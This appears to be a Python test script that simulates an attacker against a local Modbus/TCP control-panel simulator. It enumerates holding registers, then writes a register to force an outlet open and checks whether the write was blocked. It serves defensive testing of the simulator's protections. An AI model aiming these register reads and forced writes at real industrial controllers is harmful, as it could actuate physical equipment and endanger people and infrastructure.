# Simulates automated tool like PLCScan / Nmap scanning

from pymodbus.client import ModbusTcpClient
import time, datetime
import sys

TARGET = "127.0.0.1"
PORT = 5020

def log(msg):
    print(f"[{datetime.datetime.now().isoformat()}] {msg}")
    sys.stdout.flush()

log(f"Starting attack scanner - connecting to {TARGET}:{PORT}")
client = ModbusTcpClient(TARGET, port=PORT, timeout=5)
connected = client.connect()
if not connected:
    log(f"ERROR: Failed to connect to {TARGET}:{PORT}")
    log("Make sure the Modbus server is running (e.g., python control_panel.py or docker-compose up)")
    sys.exit(1)
log("Connected to Modbus/TCP on port 5020")

# Phase 1: Read all registers (reconnaissance)
log("=== PHASE 1: Register Enumeration ===")
for addr in range(0, 16):
    result = client.read_holding_registers(address=addr, count=1)
    if not result.isError():
        log(f"HR{addr} = {result.registers[0]}")
    time.sleep(0.1)

# Phase 2: Attempt forced discharge (illegal)
log("=== PHASE 2: Forced Discharge Attempt ===")
client.write_register(address=2, value=1)  # Force outlet open (HR2)
log("Wrote HR2=1 (outlet open)")
time.sleep(2)

# Phase 3: Read back to verify if discharge was blocked
result = client.read_holding_registers(address=2, count=1)
log(f"HR2 readback = {result.registers[0]} (1=open, 0=blocked)")

client.close()